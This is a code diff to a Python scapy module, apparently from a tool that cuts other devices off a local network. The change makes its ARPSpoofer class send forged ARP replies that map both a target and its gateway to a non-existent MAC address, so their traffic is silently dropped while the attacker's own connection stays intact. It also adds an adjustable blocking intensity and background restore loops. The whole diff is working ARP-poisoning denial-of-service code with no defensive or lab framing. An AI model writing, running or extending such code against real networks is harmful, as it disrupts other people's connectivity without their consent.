@@ -2,7 +2,11 @@ import random
 import threading
 import time
 
-from scapy.all import ARP, Ether, conf, sendp, get_if_hwaddr
+from scapy.all import ARP, Ether, conf, sendp
+
+# A MAC address that doesn't exist on any real network.
+# Poisoned devices send traffic here — it vanishes. We never receive it.
+_DEAD_MAC = "de:ad:be:ef:de:ad"
 
 
 class ARPSpoofer:
@@ -30,7 +34,12 @@ class ARPSpoofer:
                gateway_ip: str, gateway_mac: str) -> None:
         with self._lock:
             self._active.pop(target_ip, None)
-        self._restore(target_ip, target_mac, gateway_ip, gateway_mac)
+        # Restore in background so UI doesn't freeze
+        threading.Thread(
+            target=self._restore_loop,
+            args=(target_ip, target_mac, gateway_ip, gateway_mac),
+            daemon=True,
+        ).start()
 
     def remove_all(self, devices: list[dict],
                    gateway_ip: str, gateway_mac: str) -> None:
@@ -64,7 +73,6 @@ class ARPSpoofer:
                 block_t = 0.3 + (intensity / 100) * 2.7   # 0.3s – 3s
                 allow_t = 0.5 - (intensity / 100) * 0.45  # 0.5s – 0.05s
 
-                self._poison(target_ip, target_mac, gateway_ip, gateway_mac)
                 t0 = time.time()
                 while alive() and time.time() - t0 < block_t:
                     self._poison(target_ip, target_mac, gateway_ip, gateway_mac)
@@ -83,26 +91,43 @@ class ARPSpoofer:
                     self._restore(target_ip, target_mac, gateway_ip, gateway_mac)
                 time.sleep(0.2)
 
-    # ── ARP helpers ───────────────────────────────────────────────────────────
+    # ── ARP ───────────────────────────────────────────────────────────────────
 
     def _poison(self, target_ip: str, target_mac: str,
                 gateway_ip: str, gateway_mac: str) -> None:
+        """
+        Tell both the target and the gateway that the other's IP maps to a
+        non-existent MAC. Traffic drops on the switch — we never receive it,
+        so our own connection stays untouched.
+        """
         try:
             sendp([
-                Ether(dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip),
-                Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip),
+                Ether(dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,
+                                             psrc=gateway_ip, hwsrc=_DEAD_MAC),
+                Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
+                                             psrc=target_ip,  hwsrc=_DEAD_MAC),
             ], iface=self._iface, verbose=0)
         except Exception as e:
             print(f"[spoofer] poison failed: {e}")
 
     def _restore(self, target_ip: str, target_mac: str,
-                 gateway_ip: str, gateway_mac: str) -> None:
+                 gateway_ip: str, gateway_mac: str, count: int = 8) -> None:
+        """Send the real MAC mappings back to both sides."""
         if not target_mac or not gateway_mac:
             return
         try:
             sendp([
-                Ether(src=gateway_mac, dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip, hwsrc=gateway_mac),
-                Ether(src=target_mac,  dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip,  hwsrc=target_mac),
-            ], iface=self._iface, verbose=0, count=6)
+                Ether(src=gateway_mac, dst=target_mac)  / ARP(op=2, pdst=target_ip,
+                      hwdst=target_mac,  psrc=gateway_ip, hwsrc=gateway_mac),
+                Ether(src=target_mac,  dst=gateway_mac) / ARP(op=2, pdst=gateway_ip,
+                      hwdst=gateway_mac, psrc=target_ip,  hwsrc=target_mac),
+            ], iface=self._iface, verbose=0, count=count)
         except Exception as e:
             print(f"[spoofer] restore failed: {e}")
+
+    def _restore_loop(self, target_ip: str, target_mac: str,
+                      gateway_ip: str, gateway_mac: str) -> None:
+        """Send restore packets in 3 bursts over 1.5s to guarantee ARP update."""
+        for _ in range(3):
+            self._restore(target_ip, target_mac, gateway_ip, gateway_mac, count=8)
+            time.sleep(0.5)
